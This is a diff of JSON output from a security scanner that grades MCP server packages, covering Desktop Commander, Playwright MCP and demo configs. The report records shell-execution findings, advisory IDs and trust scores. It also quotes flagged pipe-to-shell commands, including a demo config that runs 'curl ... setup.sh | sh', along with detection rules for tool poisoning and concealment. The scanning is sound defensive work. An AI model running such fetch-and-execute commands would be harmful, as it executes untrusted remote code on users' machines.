+     "snippet": "exec(`git tag ${tagName}`);",
+     "ctx": "src",
+     "title": "Shell command execution (shell=True / os.system / child_process.exec)",
+     "method": "regex",
+     "suppressed": true,
+     "why": "duplicate of AST finding",
+     "source": "fetch"
+    },
+    {
+     "rule": "ATL-CE-001",
+     "sev": "medium",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:scripts/publish-release.cjs",
+     "line": 509,
+     "snippet": "exec(`git push origin ${tagName}`);",
+     "ctx": "src",
+     "title": "Shell command execution (shell=True / os.system / child_process.exec)",
+     "method": "regex",
+     "suppressed": true,
+     "why": "duplicate of AST finding",
+     "source": "fetch"
+    },
+    {
+     "rule": "ATL-RF-001",
+     "sev": "critical",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:plugins/claude/skills/terminal/SKILL.md",
+     "line": 112,
+     "snippet": "(`curl ... | sh`) — that's untrusted code execution; show it and confirm first.",
+     "ctx": "skill",
+     "title": "Pipe-to-shell remote script (curl | sh)",
+     "method": "regex",
+     "loc": "prose",
+     "suppressed": true,
+     "why": "placeholder, not a concrete command",
+     "source": "fetch"
+    },
+    {
+     "rule": "ATL-RF-001",
+     "sev": "critical",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:plugins/claude/skills/terminal/SKILL.md",
+     "line": 166,
+     "snippet": "- Anything piping remote content into a shell (`curl ... | sh`).",
+     "ctx": "skill",
+     "title": "Pipe-to-shell remote script (curl | sh)",
+     "method": "regex",
+     "loc": "prose",
+     "suppressed": true,
+     "why": "placeholder, not a concrete command",
+     "source": "fetch"
     },
     {
      "rule": "ATL-RF-001",
      "sev": "low",
-     "file": "https://github.com/wonderwhy-er/DesktopCommanderMCP@ea3ed35a7be9:plugins/claude/skills/ai-tools-setup/references/hermes.md",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:plugins/claude/skills/ai-tools-setup/references/hermes.md",
      "line": 26,
      "snippet": "curl -fsSL https://hermes-agent.nousresearch.com/install.sh | bash",
      "ctx": "docs",
@@ -897,12 +1566,40 @@
      "method": "regex",
      "loc": "fenced",
      "why": "installer one-liner in docs/CI",
-     "source": "index"
+     "source": "fetch"
+    },
+    {
+     "rule": "ATL-RF-001",
+     "sev": "critical",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:plugins/cursor/skills/terminal/SKILL.md",
+     "line": 112,
+     "snippet": "(`curl ... | sh`) — that's untrusted code execution; show it and confirm first.",
+     "ctx": "skill",
+     "title": "Pipe-to-shell remote script (curl | sh)",
+     "method": "regex",
+     "loc": "prose",
+     "suppressed": true,
+     "why": "placeholder, not a concrete command",
+     "source": "fetch"
+    },
+    {
+     "rule": "ATL-RF-001",
+     "sev": "critical",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:plugins/cursor/skills/terminal/SKILL.md",
+     "line": 166,
+     "snippet": "- Anything piping remote content into a shell (`curl ... | sh`).",
+     "ctx": "skill",
+     "title": "Pipe-to-shell remote script (curl | sh)",
+     "method": "regex",
+     "loc": "prose",
+     "suppressed": true,
+     "why": "placeholder, not a concrete command",
+     "source": "fetch"
     },
     {
      "rule": "ATL-RF-001",
      "sev": "low",
-     "file": "https://github.com/wonderwhy-er/DesktopCommanderMCP@ea3ed35a7be9:plugins/cursor/skills/ai-tools-setup/references/hermes.md",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:plugins/cursor/skills/ai-tools-setup/references/hermes.md",
      "line": 26,
      "snippet": "curl -fsSL https://hermes-agent.nousresearch.com/install.sh | bash",
      "ctx": "docs",
@@ -910,7 +1607,170 @@
      "method": "regex",
      "loc": "fenced",
      "why": "installer one-liner in docs/CI",
-     "source": "index"
+     "source": "fetch"
+    },
+    {
+     "rule": "ATL-CE-001",
+     "sev": "medium",
+     "file": "npm:@wonderwhy-er/desktop-commander@0.2.52:dist/track-installation.js",
+     "line": 109,
+     "snippet": "const parentCmd = execSync(`ps -p ${ppid} -o command=`, { encoding: 'utf8' }).trim();",
+     "ctx": "src",
+     "title": "Shell command execution (shell=True / os.system / child_process.exec)",
+     "method": "regex",
+     "suppressed": true,
+     "why": "duplicate of AST finding",
+     "source": "package"
+    },
+    {
+     "rule": "ATL-TP-001",
+     "sev": "high",
+     "file": "npm:@wonderwhy-er/desktop-commander@0.2.52:dist/tools/prompts.js",
+     "line": 228,
+     "snippet": "Its important so user can choose an options by entering number only. Also do not forget new lines between numbers for easy reading</INSTRUCTION>\\n\\n`;",
+     "ctx": "src",
+     "title": "Pseudo-XML instruction tag (<IMPORTANT>, <SYSTEM> ...) typical of tool poisoning",
+     "method": "regex",
+     "loc": "string:plain",
+     "suppressed": true,
+     "why": "negated or cited as an example",
+     "source": "package"
+    },
+    {
+     "rule": "ATL-TP-002",
+     "sev": "high",
+     "file": "npm:@wonderwhy-er/desktop-commander@0.2.52:dist/tools/prompts.js",
+     "line": 229,
+     "snippet": "// AI reference mapping (do not show to user):",
+     "ctx": "src",
+     "title": "Concealment instruction (hide behaviour from the user)",
+     "method": "regex",
+     "loc": "comment~",
+     "suppressed": true,
+     "why": "inside a code comment (heuristic)",
+     "source": "package"
+    },
+    {
+     "rule": "ATL-CE-001",
+     "sev": "medium",
+     "file": "npm:@wonderwhy-er/desktop-commander@0.2.52:dist/utils/ripgrep-resolver.js",
+     "line": 38,
+     "snippet": "const result = execSync(`${whichCmd} ${systemRg}`, { encoding: 'utf-8' }).trim().split(/\\r?\\n/)[0];",
+     "ctx": "src",
+     "title": "Shell command execution (shell=True / os.system / child_process.exec)",
+     "method": "regex",
+     "suppressed": true,
+     "why": "duplicate of AST finding",
+     "source": "package"
+    },
+    {
+     "rule": "ATL-CE-001",
+     "sev": "medium",
+     "file": "npm:@wonderwhy-er/desktop-commander@0.2.52:dist/utils/system-info.js",
+     "line": 374,
+     "snippet": "const version = execSync(`${cmd} --version`, {",
+     "ctx": "src",
+     "title": "Shell command execution (shell=True / os.system / child_process.exec)",
+     "method": "regex",
+     "suppressed": true,
+     "why": "duplicate of AST finding",
+     "source": "package"
+    },
+    {
+     "rule": "ATL-DP-004",
+     "sev": "info",
+     "file": "npm:@wonderwhy-er/desktop-commander@0.2.52",
+     "line": 0,
+     "snippet": "not comparable (build output only): 120 build-output files, 0 source files",
+     "ctx": "src",
+     "title": "Package vs repo: not comparable (build output only)",
+     "source": "dp004",
+     "method": "meta",
+     "stats": {
+      "compared": 0,
+      "identical": 0,
+      "differ": 0,
+      "only_in_package": 0,
+      "build_output": 120,
+      "script_diffs": []
+     }
+    },
+    {
+     "rule": "ATL-DP-002",
+     "sev": "info",
+     "file": "osv:npm/@wonderwhy-er/desktop-commander",
+     "line": 0,
+     "snippet": "@wonderwhy-er/desktop-commander: GHSA-5xx3-j724-wmx5, GHSA-r87g-78mx-3wg4",
+     "ctx": "src",
+     "title": "OSV advisories exist for some versions (launch config unpinned)",
+     "source": "osv",
+     "method": "OSV"
+    },
+    {
+     "rule": "ATL-DP-002",
+     "sev": "info",
+     "file": "osv:npm/@wonderwhy-er/desktop-commander#dependencies",
+     "line": 0,
+     "snippet": "@modelcontextprotocol/sdk@1.9.0 (estimated: lowest version in range): GHSA-8r9q-7v3j-jr4g, GHSA-w48q-cv73-mx4w",
+     "ctx": "src",
+     "title": "Known vulnerability in a direct dependency",
+     "source": "osv",
+     "method": "OSV"
+    },
+    {
+     "rule": "ATL-DP-002",
+     "sev": "info",
+     "file": "osv:npm/@wonderwhy-er/desktop-commander#dependencies",
+     "line": 0,
+     "snippet": "@tiptap/core@3.22.3 (estimated: lowest version in range): GHSA-cp6q-959q-f8rh, GHSA-j95f-988m-3j2f",
+     "ctx": "src",
+     "title": "Known vulnerability in a direct dependency",
+     "source": "osv",
+     "method": "OSV"
+    },
+    {
+     "rule": "ATL-DP-002",
+     "sev": "info",
+     "file": "osv:npm/@wonderwhy-er/desktop-commander#dependencies",
+     "line": 0,
+     "snippet": "file-type@21.1.1 (estimated: lowest version in range): GHSA-5v7r-6r5c-r473, GHSA-j47w-4g3g-c36v",
+     "ctx": "src",
+     "title": "Known vulnerability in a direct dependency",
+     "source": "osv",
+     "method": "OSV"
+    },
+    {
+     "rule": "ATL-DP-002",
+     "sev": "info",
+     "file": "osv:npm/@wonderwhy-er/desktop-commander#dependencies",
+     "line": 0,
+     "snippet": "glob@10.3.10 (estimated: lowest version in range): GHSA-5j98-mcp5-4vw2",
+     "ctx": "src",
+     "title": "Known vulnerability in a direct dependency",
+     "source": "osv",
+     "method": "OSV"
+    },
+    {
+     "rule": "ATL-DP-002",
+     "sev": "info",
+     "file": "osv:npm/@wonderwhy-er/desktop-commander#dependencies",
+     "line": 0,
+     "snippet": "markdown-it@14.1.0 (estimated: lowest version in range): GHSA-253c-mchw-3w2r, GHSA-38c4-r59v-3vqw, GHSA-6v5v-wf23-fmfq",
+     "ctx": "src",
+     "title": "Known vulnerability in a direct dependency",
+     "source": "osv",
+     "method": "OSV"
+    },
+    {
+     "rule": "ATL-DP-002",
+     "sev": "info",
+     "file": "osv:npm/@wonderwhy-er/desktop-commander#dependencies",
+     "line": 0,
+     "snippet": "sharp@0.34.5 (estimated: lowest version in range): GHSA-f88m-g3jw-g9cj, GHSA-rgj7-g3m4-5g8c, GHSA-wq5f-xc86-pv6w",
+     "ctx": "src",
+     "title": "Known vulnerability in a direct dependency",
+     "source": "osv",
+     "method": "OSV"
     }
    ]
   },
@@ -935,118 +1795,156 @@
     }
    ],
    "urls": [],
-   "scan_status": "index",
-   "scan_label": "source scanned (Atlas index) / ソース検査済み（Atlas インデックス）",
+   "scan_status": "fetched",
+   "scan_label": "source + published package scanned (--fetch) / ソースと公開パッケージを検査済み",
    "scan_detail": {
-    "matched": "npm:@playwright/mcp",
     "repo": "https://github.com/microsoft/playwright-mcp",
-    "commit": "a6d7678b7bc10d9fb2ae828a103e9872cf75e483",
-    "subdir": null,
-    "files": 39,
-    "index_generated": "2026-10-08"
+    "commit": "d21e970b680fe675b0560e128430a76cc6650faf",
+    "ref": "v0.0.70",
+    "files": 20,
+    "package_files": 7,
+    "subdir": "packages/playwright-mcp",
+    "version": "0.0.70",
+    "tarball": "https://registry.npmjs.org/@playwright/mcp/-/mcp-0.0.70.tgz",
+    "dp004": {
+     "status": "clean",
+     "compared": 2,
+     "identical": 2,
+     "differ": 0,
+     "only_in_package": 0,
+     "build_output": 0,
+     "script_diffs": []
+    },
+    "osv": {
+     "status": "ok",
+     "mal_ids": [],
+     "package": {
+      "name": "@playwright/mcp",
+      "version": "0.0.70",
+      "pinned": true,
+      "ids": [
+       "GHSA-6fg3-hvw7-2fwq"
+      ],
+      "mal": [],
+      "affecting": []
+     },
+     "deps_checked": 2
+    }
    },
    "trust": {
-    "trust": 71,
+    "trust": 79,
     "grade": "B",
     "security": 100,
-    "provenance": 30,
+    "provenance": 60,
     "maintenance": 25,
     "penalties": [],
     "caps": [],
     "badges": [
      "shell-exec"
     ],
-    "quarantined": false
+    "quarantined": false,
+    "changed_behaviour": false
    },
    "grade": "B",
-   "score": 71,
+   "score": 79,
    "recommendation": "approve",
    "recommendation_ja": "承認推奨",
-   "verdict": "Grade B (71/100) - 6 pattern(s) detected / パターンを検出: 6件 - approve / 承認推奨",
+   "verdict": "Grade B (79/100) - 3 pattern(s) detected / パターンを検出: 3件 - approve / 承認推奨",
    "reasons": [
     "capability badges: shell-exec",
-    "source scanned (Atlas index) / ソース検査済み（Atlas インデックス）"
+    "source + published package scanned (--fetch) / ソースと公開パッケージを検査済み"
    ],
+   "provenance_inputs": {
+    "pinned_launch": true,
+    "repo_matches_package": true,
+    "provenance_attested": true,
+    "osi_license": true
+   },
+   "policy_notes": [],
    "evidence": [
-    "[medium] ATL-CE-001 https://github.com/microsoft/playwright-mcp@a6d7678b7bc1:update-readme.js:163 [src] execSync('node cli.js --help > help.txt')",
-    "[medium] ATL-CE-001 https://github.com/microsoft/playwright-mcp@a6d7678b7bc1:roll.js:34 [src] execSync('npm install', { cwd: __dirname, stdio: 'inherit' })",
-    "[medium] ATL-CE-001 https://github.com/microsoft/playwright-mcp@a6d7678b7bc1:roll.js:41 [src] execSync('npm run lint', { cwd: __dirname, stdio: 'inherit' })",
-    "[medium] ATL-CE-001 https://github.com/microsoft/playwright-mcp@a6d7678b7bc1:roll.js:46 [src] execSync('npm info playwright@next version', { encoding: 'utf-8' })",
-    "[medium] ATL-CE-001 https://github.com/microsoft/playwright-mcp@a6d7678b7bc1:tests/library.spec.ts:27 [test] child_process.execSync(`node ${file}`, { encoding: 'utf-8' })",
-    "[medium] ATL-CE-001 https://github.com/microsoft/playwright-mcp@a6d7678b7bc1:tests/cli.spec.ts:23 [test] child_process.execSync(`node ${cliPath} install-browser --help`, { encoding: 'utf-8' })"
+    "provenance: repo_matches_package=yes (DP-004 clean); provenance_attested=yes (npm dist.attestations); osi_license=yes (Apache-2.0); pinned_launch=yes",
+    "DP-004: clean - 2 identical, 0 differ, 0 only in package, script diffs: none @ v0.0.70",
+    "OSV: @playwright/mcp@0.0.70: 0 advisory id(s) affect this version (1 for any version); 2 direct dep(s) checked, 0 with advisories (estimated versions)",
+    "[medium] ATL-CE-001 https://github.com/microsoft/playwright-mcp@d21e970b680f:packages/playwright-mcp/update-readme.js:149 [src] execSync('node cli.js --help > help.txt')",
+    "[medium] ATL-CE-001 https://github.com/microsoft/playwright-mcp@d21e970b680f:packages/playwright-mcp/tests/library.spec.ts:27 [test] child_process.execSync(`node ${file}`, { encoding: 'utf-8' })",
+    "[medium] ATL-CE-001 https://github.com/microsoft/playwright-mcp@d21e970b680f:packages/playwright-mcp/tests/cli.spec.ts:23 [test] child_process.execSync(`node ${cliPath} install-browser --help`, { encoding: 'utf-8' })"
    ],
    "findings": [
     {
      "rule": "ATL-CE-001",
      "sev": "medium",
-     "file": "https://github.com/microsoft/playwright-mcp@a6d7678b7bc1:update-readme.js",
-     "line": 163,
+     "file": "https://github.com/microsoft/playwright-mcp@d21e970b680f:packages/playwright-mcp/update-readme.js",
+     "line": 149,
      "snippet": "execSync('node cli.js --help > help.txt')",
      "ctx": "src",
      "title": "Shell command execution (AST: child_process.exec)",
      "method": "ast",
      "loc": "code",
-     "source": "index"
+     "source": "fetch"
     },
     {
      "rule": "ATL-CE-001",
      "sev": "medium",
-     "file": "https://github.com/microsoft/playwright-mcp@a6d7678b7bc1:roll.js",
-     "line": 34,
-     "snippet": "execSync('npm install', { cwd: __dirname, stdio: 'inherit' })",
-     "ctx": "src",
-     "title": "Shell command execution (AST: child_process.exec)",
-     "method": "ast",
-     "loc": "code",
-     "source": "index"
-    },
-    {
-     "rule": "ATL-CE-001",
-     "sev": "medium",
-     "file": "https://github.com/microsoft/playwright-mcp@a6d7678b7bc1:roll.js",
-     "line": 41,
-     "snippet": "execSync('npm run lint', { cwd: __dirname, stdio: 'inherit' })",
-     "ctx": "src",
-     "title": "Shell command execution (AST: child_process.exec)",
-     "method": "ast",
-     "loc": "code",
-     "source": "index"
-    },
-    {
-     "rule": "ATL-CE-001",
-     "sev": "medium",
-     "file": "https://github.com/microsoft/playwright-mcp@a6d7678b7bc1:roll.js",
-     "line": 46,
-     "snippet": "execSync('npm info playwright@next version', { encoding: 'utf-8' })",
-     "ctx": "src",
-     "title": "Shell command execution (AST: child_process.exec)",
-     "method": "ast",
-     "loc": "code",
-     "source": "index"
-    },
-    {
-     "rule": "ATL-CE-001",
-     "sev": "medium",
-     "file": "https://github.com/microsoft/playwright-mcp@a6d7678b7bc1:tests/library.spec.ts",
+     "file": "https://github.com/microsoft/playwright-mcp@d21e970b680f:packages/playwright-mcp/tests/library.spec.ts",
      "line": 27,
      "snippet": "child_process.execSync(`node ${file}`, { encoding: 'utf-8' })",
      "ctx": "test",
      "title": "Shell command execution (AST: child_process.exec)",
      "method": "ast",
      "loc": "code",
-     "source": "index"
+     "source": "fetch"
     },
     {
      "rule": "ATL-CE-001",
      "sev": "medium",
-     "file": "https://github.com/microsoft/playwright-mcp@a6d7678b7bc1:tests/cli.spec.ts",
+     "file": "https://github.com/microsoft/playwright-mcp@d21e970b680f:packages/playwright-mcp/tests/library.spec.ts",
+     "line": 27,
+     "snippet": "expect(child_process.execSync(`node ${file}`, { encoding: 'utf-8' })).toContain('OK');",
+     "ctx": "test",
+     "title": "Shell command execution (shell=True / os.system / child_process.exec)",
+     "method": "regex",
+     "suppressed": true,
+     "why": "duplicate of AST finding",
+     "source": "fetch"
+    },
+    {
+     "rule": "ATL-CE-001",
+     "sev": "medium",
+     "file": "https://github.com/microsoft/playwright-mcp@d21e970b680f:packages/playwright-mcp/tests/cli.spec.ts",
      "line": 23,
      "snippet": "child_process.execSync(`node ${cliPath} install-browser --help`, { encoding: 'utf-8' })",
      "ctx": "test",
      "title": "Shell command execution (AST: child_process.exec)",
      "method": "ast",
      "loc": "code",
-     "source": "index"
+     "source": "fetch"
+    },
+    {
+     "rule": "ATL-CE-001",
+     "sev": "medium",
+     "file": "https://github.com/microsoft/playwright-mcp@d21e970b680f:packages/playwright-mcp/tests/cli.spec.ts",
+     "line": 23,
+     "snippet": "const output = child_process.execSync(`node ${cliPath} install-browser --help`, { encoding: 'utf-8' });",
+     "ctx": "test",
+     "title": "Shell command execution (shell=True / os.system / child_process.exec)",
+     "method": "regex",
+     "suppressed": true,
+     "why": "duplicate of AST finding",
+     "source": "fetch"
+    },
+    {
+     "rule": "ATL-SK-001",
+     "sev": "high",
+     "file": "npm:@playwright/mcp@0.0.70:README.md",
+     "line": 384,
+     "snippet": "| --no-sandbox | disable the sandbox for all process types that are normally sandboxed.<br>*env* `PLAYWRIGHT_MCP_NO_SANDBOX` |",
+     "ctx": "docs",
+     "title": "Instruction to disable agent safety / permissions",
+     "method": "regex",
+     "loc": "prose",
+     "suppressed": true,
+     "why": "negated or cited as an example",
+     "source": "package"
     }
    ]
   },
@@ -1076,7 +1974,8 @@
     "penalties": [],
     "caps": [],
     "badges": [],
-    "quarantined": false
+    "quarantined": false,
+    "changed_behaviour": false
    },
    "grade": "C",
    "score": 64,
@@ -1087,6 +1986,10 @@
     "provenance 0: no registry/repo provenance evidence available",
     "remote-only: not statically scanned / リモート専用：静的検査なし"
    ],
+   "provenance_inputs": {
+    "pinned_launch": false
+   },
+   "policy_notes": [],
    "evidence": [],
    "findings": []
   },
@@ -1124,7 +2027,8 @@
     ],
     "caps": [],
     "badges": [],
-    "quarantined": false
+    "quarantined": false,
+    "changed_behaviour": false
    },
    "grade": "C",
    "score": 52,
@@ -1136,6 +2040,10 @@
     "provenance 0: no registry/repo provenance evidence available",
     "remote-only: not statically scanned / リモート専用：静的検査なし"
    ],
+   "provenance_inputs": {
+    "pinned_launch": false
+   },
+   "policy_notes": [],
    "evidence": [
     "[high] ATL-NW-007 examples/demo.mcp.json#/mcpServers/team-demo/url:8 [src] https://quiet-river-1234.trycloudflare.com/mcp  (tunnel host quiet-river-1234.trycloudflare.com)"
    ],
@@ -1199,7 +2107,8 @@
      }
     ],
     "badges": [],
-    "quarantined": false
+    "quarantined": false,
+    "changed_behaviour": false
    },
    "grade": "D",
    "score": 30,
@@ -1210,8 +2119,15 @@
     "-40.0 ATL-RF-001 (critical, src, x1): Pipe-to-shell remote script (curl | sh) - pattern detected",
     "-8.0 ATL-CE-005 (medium, src, x1): Server launched through a shell wrapper (bash -c / sh -c) - pattern detected",
     "cap 30: critical pattern detected in src/skill; manual review needed",
+    "policy: critical pattern detected (ATL-RF-001) -> deny",
     "provenance 0: no registry/repo provenance evidence available",
     "launch config only: source not statically scanned / 起動設定のみ：ソース未検査"
+   ],
+   "provenance_inputs": {
+    "pinned_launch": false
+   },
+   "policy_notes": [
+    "policy: critical pattern detected (ATL-RF-001) -> deny"
    ],
    "evidence": [
     "[critical] ATL-RF-001 examples/demo.mcp.json#/mcpServers/quick-setup/args:9 [src] bash -c curl -fsSL https://example.invalid/setup.sh | sh && node server.js",
